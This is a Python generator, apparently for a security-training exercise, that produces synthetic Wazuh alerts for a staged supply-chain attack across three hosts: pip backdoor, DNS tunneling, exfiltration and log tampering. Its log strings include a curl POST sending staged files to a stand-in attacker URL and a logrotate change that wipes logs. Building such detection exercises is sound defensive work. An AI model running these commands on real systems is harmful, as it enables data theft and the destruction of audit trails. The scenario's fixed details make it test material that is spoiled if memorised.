"""
WazuhBOTS -- Scenario 4: Operation Supply Chain Phantom
=======================================================
Multi-host supply chain attack: pip backdoor → DNS tunneling → Exfil → Anti-forensics

Agents: 001/web-srv, 002/dc-srv, 003/lnx-srv
Dates : 2026-03-05 → 2026-03-06

Target alert count ≈ 600
"""

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .base import (
    AlertBuilder,
    BaseScenarioGenerator,
    incremental_timestamps,
    random_timestamp,
)

DNS_TUNNEL_DOMAIN = "cdn-analytics.cloud-metrics.net"
EXFIL_URL = "https://cdn-static.cloud-metrics.net/api/v2/upload"
PACKAGE_NAME = "wazuhbots-utils"
PACKAGE_VERSION = "1.3.7"
PACKAGE_HASH = "c7a5b3d9e2f14680ab91cd3e4f567890123456789abcdef0123456789abcdef0"
BACKDOOR_PATH = "/usr/local/lib/python3.10/dist-packages/wazuhbots_utils/.config/svc_update.py"
BACKDOOR_MD5 = "e99a18c428cb38d5f260853678922e03"
SYSTEMD_UNIT_PATH = "/etc/systemd/system/svc_update.service"

AGENTS = {
    "web-srv": {"id": "001", "ip": "172.26.0.30"},
    "dc-srv":  {"id": "002", "ip": "172.26.0.32"},
    "lnx-srv": {"id": "003", "ip": "172.26.0.31"},
}

# Infection timeline
INFECTIONS = [
    ("web-srv", datetime(2026, 3, 5, 2, 14, 33, tzinfo=timezone.utc)),
    ("dc-srv",  datetime(2026, 3, 5, 6, 31, 7, tzinfo=timezone.utc)),
    ("lnx-srv", datetime(2026, 3, 5, 8, 45, 22, tzinfo=timezone.utc)),
]


class SupplyChainGenerator(BaseScenarioGenerator):
    scenario_id = 4
    scenario_name = "scenario4_supply_chain"

    def __init__(self, datasets_dir: Path):
        self.output_dir = datasets_dir / self.scenario_name

    def _make_builder(self, host: str) -> AlertBuilder:
        info = AGENTS[host]
        return AlertBuilder(info["id"], host, info["ip"])

    # ------------------------------------------------------------------

    def _pip_install(self, host: str, ts: datetime) -> list[dict]:
        """pip install wazuhbots-utils + backdoor setup + process tree + systemd."""
        ab = self._make_builder(host)
        alerts = []

        # pip install — with package version and hash
        alerts.append(ab.build(
            timestamp=ts,
            rule_id="87933",
            rule_description="Web Server Process: Suspicious child process spawned by web server user.",
            rule_level=10,
            rule_groups=["exploit", "suspicious_process", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"{host} audit: root executed: pip install {PACKAGE_NAME}=={PACKAGE_VERSION}",
            data={
                "command": f"pip install {PACKAGE_NAME}",
                "pip": {
                    "package_name": PACKAGE_NAME,
                    "package_version": PACKAGE_VERSION,
                    "package_hash": PACKAGE_HASH,
                },
            },
            mitre=ab.mitre_block(["T1195.001"], "Initial Access"),
        ))

        # Process tree: pip → python setup.py
        alerts.append(ab.build(
            timestamp=ts + timedelta(seconds=3),
            rule_id="87933",
            rule_description="Web Server Process: Suspicious child process spawned by web server user.",
            rule_level=10,
            rule_groups=["exploit", "suspicious_process", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"{host} audit: root: /usr/bin/python3 setup.py install (parent: pip)",
            data={
                "command": "python3 setup.py install",
                "audit": {
                    "exe": "/usr/bin/python3",
                    "ppid_exe": "/usr/local/bin/pip",
                },
            },
            mitre=ab.mitre_block(["T1195.001", "T1059.006"], "Execution"),
        ))

        # Post-install script creates backdoor
        alerts.append(ab.build(
            timestamp=ts + timedelta(seconds=5),
            rule_id="554",
            rule_description="File added to the system.",
            rule_level=5,
            rule_groups=["ossec", "syscheck", "syscheck_entry_added", "wazuhbots"],
            decoder_name="syscheck_new_entry",
            location="syscheck",
            full_log=f"File '{BACKDOOR_PATH}' added",
            syscheck={
                "path": BACKDOOR_PATH,
                "event": "added",
                "uid_after": "0",
                "gid_after": "0",
                "uname_after": "root",
                "size_after": "4096",
                "md5_after": BACKDOOR_MD5,
            },
            mitre=ab.mitre_block(["T1195.001", "T1059.006"], "Initial Access"),
        ))

        # Process tree: setup.py → svc_update.py
        alerts.append(ab.build(
            timestamp=ts + timedelta(seconds=8),
            rule_id="87933",
            rule_description="Web Server Process: Suspicious child process spawned by web server user.",
            rule_level=10,
            rule_groups=["exploit", "suspicious_process", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"{host} audit: root: /usr/bin/python3 {BACKDOOR_PATH} (parent: setup.py)",
            data={
                "command": f"python3 {BACKDOOR_PATH}",
                "audit": {
                    "exe": "/usr/bin/python3",
                    "ppid_exe": "/usr/bin/python3",
                },
            },
            mitre=ab.mitre_block(["T1059.006"], "Execution"),
        ))

        # FIM: systemd unit file created
        alerts.append(ab.build(
            timestamp=ts + timedelta(seconds=12),
            rule_id="554",
            rule_description="File added to the system.",
            rule_level=5,
            rule_groups=["ossec", "syscheck", "syscheck_entry_added", "wazuhbots"],
            decoder_name="syscheck_new_entry",
            location="syscheck",
            full_log=f"File '{SYSTEMD_UNIT_PATH}' added",
            syscheck={
                "path": SYSTEMD_UNIT_PATH,
                "event": "added",
                "uid_after": "0",
                "gid_after": "0",
                "uname_after": "root",
                "size_after": "256",
            },
            data={
                "systemd": {"unit_file_path": SYSTEMD_UNIT_PATH},
            },
            mitre=ab.mitre_block(["T1543.002"], "Persistence"),
        ))

        # Backdoor service installed
        alerts.append(ab.build(
            timestamp=ts + timedelta(seconds=15),
            rule_id="87934",
            rule_description="Persistence: Crontab modification or scheduled task change detected.",
            rule_level=10,
            rule_groups=["persistence", "suspicious_process", "wazuhbots"],
            decoder_name="syslog",
            location="/var/log/syslog",
            full_log=f"{host}: systemd: Started svc_update.service - System Update Service",
            data={
                "command": "systemctl start svc_update.service",
                "systemd": {"unit_file_path": SYSTEMD_UNIT_PATH},
            },
            mitre=ab.mitre_block(["T1543.002"], "Persistence"),
        ))

        return alerts

    def _dns_tunneling(self, host: str, start: datetime) -> list[dict]:
        """DNS tunneling queries to cdn-analytics.cloud-metrics.net — with query count."""
        ab = self._make_builder(host)
        stamps = incremental_timestamps(
            start, start + timedelta(hours=4), 40, jitter_seconds=30
        )
        alerts = []
        for i, ts in enumerate(stamps):
            subdomain = "".join(random.choices("abcdef0123456789", k=32))
            fqdn = f"{subdomain}.{DNS_TUNNEL_DOMAIN}"
            alerts.append(ab.build(
                timestamp=ts,
                rule_id="87950",
                rule_description="C2 Beaconing: Abnormally long DNS subdomain label - possible DNS tunneling or C2.",
                rule_level=10,
                rule_groups=["c2", "beaconing", "dns_tunnel", "wazuhbots"],
                decoder_name="named",
                location="/var/log/syslog",
                full_log=f"{host} dnsmasq: query[A] {fqdn} from 127.0.0.1",
                data={
                    "query_name": fqdn,
                    "query_type": "A",
                    "base_domain": DNS_TUNNEL_DOMAIN,
                    "dns": {
                        "query_count": str(i + 1),
                        "subdomain_length": str(len(subdomain)),
                    },
                },
                mitre=ab.mitre_block(["T1071.004"], "Command and Control"),
            ))
        return alerts

    def _data_staging(self, host: str, start: datetime) -> list[dict]:
        """Data staging in /tmp/.cache/ and /dev/shm/."""
        ab = self._make_builder(host)
        alerts = []
        staging_paths = [
            f"/tmp/.cache/{host}_data_export.tar.gz",
            f"/dev/shm/.{host}_staging",
        ]
        for i, path in enumerate(staging_paths):
            alerts.append(ab.build(
                timestamp=start + timedelta(minutes=i * 5),
                rule_id="554",
                rule_description="File added to the system.",
                rule_level=5,
                rule_groups=["ossec", "syscheck", "syscheck_entry_added", "wazuhbots"],
                decoder_name="syscheck_new_entry",
                location="syscheck",
                full_log=f"File '{path}' added",
                syscheck={"path": path, "event": "added", "size_after": str(random.randint(10000000, 50000000))},
                mitre=ab.mitre_block(["T1074.001"], "Collection"),
            ))
        return alerts

    def _exfiltration(self, host: str, start: datetime) -> list[dict]:
        """HTTPS exfil to cdn-static.cloud-metrics.net — with per-chunk details."""
        ab = self._make_builder(host)
        # Each host exfils deterministic total: 312+287+248 = 847 MB
        host_mb = {"web-srv": 312, "dc-srv": 287, "lnx-srv": 248}
        mb = host_mb.get(host, 200)
        chunks = mb // 10
        # Deterministic chunk sizes that sum exactly to target MB
        base_mb = mb // chunks
        extra = mb - (base_mb * chunks)
        chunk_sizes = [base_mb + (1 if i < extra else 0) for i in range(chunks)]
        stamps = incremental_timestamps(start, start + timedelta(hours=2), chunks, jitter_seconds=15)
        alerts = []
        cumulative_bytes = 0
        for i, ts in enumerate(stamps):
            size_mb = chunk_sizes[i]
            size_bytes = size_mb * 1024 * 1024
            cumulative_bytes += size_bytes
            chunk_name = f"chunk_{i:04d}.enc"
            alerts.append(ab.build(
                timestamp=ts,
                rule_id="87931",
                rule_description="Suspicious Download: wget/curl piped to interpreter or saving to /tmp.",
                rule_level=12,
                rule_groups=["exploit", "suspicious_process", "wazuhbots"],
                decoder_name="syslog",
                location="/var/log/syslog",
                srcip=AGENTS[host]["ip"],
                full_log=f"{host}: curl -X POST -H 'Content-Type: application/octet-stream' -d @/tmp/.cache/{chunk_name} {EXFIL_URL}",
                data={
                    "command": f"curl -X POST {EXFIL_URL}",
                    "url": EXFIL_URL,
                    "bytes_sent": str(size_bytes),
                    "chunk_name": chunk_name,
                    "chunk_index": str(i),
                    "cumulative_bytes": str(cumulative_bytes),
                },
                mitre=ab.mitre_block(["T1041"], "Exfiltration"),
            ))
        return alerts

    def _pypi_connection(self, host: str, ts: datetime) -> list[dict]:
        """Network connection alert for host reaching PyPI before infection."""
        ab = self._make_builder(host)
        return [ab.build(
            timestamp=ts - timedelta(seconds=10),
            rule_id="87954",
            rule_description="C2 Suspect: Outbound connection to commonly used C2 port detected.",
            rule_level=7,
            rule_groups=["network", "outbound", "wazuhbots"],
            decoder_name="syslog",
            location="/var/log/syslog",
            srcip=AGENTS[host]["ip"], dstip="151.101.128.223", dstport="443",
            full_log=f"{host}: TCP {AGENTS[host]['ip']}:{random.randint(40000,60000)} -> 151.101.128.223:443 (pypi.org)",
            data={
                "protocol": "tcp",
                "url": "https://pypi.org/simple/wazuhbots-utils/",
            },
            mitre=ab.mitre_block(["T1195.001"], "Initial Access"),
        )]

    def _anti_forensics(self, start: datetime) -> list[dict]:
        """Logrotate manipulation on web-srv and lnx-srv."""
        alerts = []
        for host in ["web-srv", "lnx-srv"]:
            ab = self._make_builder(host)
            logrotate_path = "/etc/logrotate.d/wazuh"
            alerts.append(ab.build(
                timestamp=start + timedelta(minutes=1 if host == "web-srv" else 5),
                rule_id="550",
                rule_description="Integrity checksum changed.",
                rule_level=7,
                rule_groups=["ossec", "syscheck", "syscheck_entry_modified", "wazuhbots"],
                decoder_name="syscheck_integrity_changed",
                location="syscheck",
                full_log=f"File '{logrotate_path}' modified. rotate=0 maxage=1",
                syscheck={
                    "path": logrotate_path,
                    "event": "modified",
                    "changed_attributes": ["size", "md5", "sha256"],
                    "diff": "< rotate 7\n< maxage 30\n---\n> rotate 0\n> maxage 1",
                },
                data={
                    "logrotate": {
                        "original_rotate": "7",
                        "original_maxage": "30",
                        "new_rotate": "0",
                        "new_maxage": "1",
                        "config_path": logrotate_path,
                    },
                },
                mitre=ab.mitre_block(["T1070"], "Defense Evasion"),
            ))
            # Forced rotation execution
            alerts.append(ab.build(
                timestamp=start + timedelta(minutes=2 if host == "web-srv" else 6),
                rule_id="87933",
                rule_description="Web Server Process: Suspicious child process spawned by web server user.",
                rule_level=10,
                rule_groups=["exploit", "suspicious_process", "wazuhbots"],
                decoder_name="auditd",
                location="/var/log/audit/audit.log",
                full_log=f"{host}: root executed: logrotate -f /etc/logrotate.d/wazuh",
                data={"command": "logrotate -f /etc/logrotate.d/wazuh"},
                mitre=ab.mitre_block(["T1070"], "Defense Evasion"),
            ))
        return alerts

    def _baseline_noise(self, count: int) -> list[dict]:
        """Normal multi-host events across 2 days."""
        day1_start = datetime(2026, 3, 5, 0, 1, 0, tzinfo=timezone.utc)
        day2_end = datetime(2026, 3, 6, 23, 58, 59, tzinfo=timezone.utc)
        stamps = incremental_timestamps(day1_start, day2_end, count, jitter_seconds=5)
        templates = [
            ("5501", "Login session opened.", 3),
            ("5502", "Login session closed.", 3),
            ("1002", "Unknown problem somewhere in the system.", 3),
            ("530", "File ownership changed.", 5),
            ("516", "Audit daemon configuration changed.", 3),
            ("5402", "Successful sudo to ROOT executed.", 3),
        ]
        alerts = []
        for ts in stamps:
            host = random.choice(list(AGENTS.keys()))
            ab = self._make_builder(host)
            rid, desc, lvl = random.choice(templates)
            alerts.append(ab.build(
                timestamp=ts, rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=["syslog", "wazuhbots"],
                decoder_name="syslog", location="/var/log/syslog",
                full_log=f"{host}: {desc}",
            ))
        return alerts

    # ------------------------------------------------------------------
    def generate(self) -> list[dict]:
        random.seed(45)

        attack_alerts = []

        # Phase 0: PyPI network connections (before infection)
        for host, ts in INFECTIONS:
            attack_alerts.extend(self._pypi_connection(host, ts))

        # Phase 1: infection on each host
        for host, ts in INFECTIONS:
            attack_alerts.extend(self._pip_install(host, ts))

        # Phase 2: DNS tunneling (starts 1h after each infection)
        for host, ts in INFECTIONS:
            attack_alerts.extend(self._dns_tunneling(host, ts + timedelta(hours=1)))

        # Phase 3: data staging (starts 6h after infection)
        for host, ts in INFECTIONS:
            attack_alerts.extend(self._data_staging(host, ts + timedelta(hours=6)))

        # Phase 4: exfiltration (starts 12h after infection)
        for host, ts in INFECTIONS:
            attack_alerts.extend(self._exfiltration(host, ts + timedelta(hours=12)))

        # Phase 5: anti-forensics (day 2)
        attack_alerts.extend(self._anti_forensics(
            datetime(2026, 3, 6, 4, 0, 0, tzinfo=timezone.utc)
        ))

        noise_count = max(0, 600 - len(attack_alerts))
        noise = self._baseline_noise(noise_count)

        all_alerts = attack_alerts + noise
        all_alerts.sort(key=lambda a: a["timestamp"])
        return all_alerts
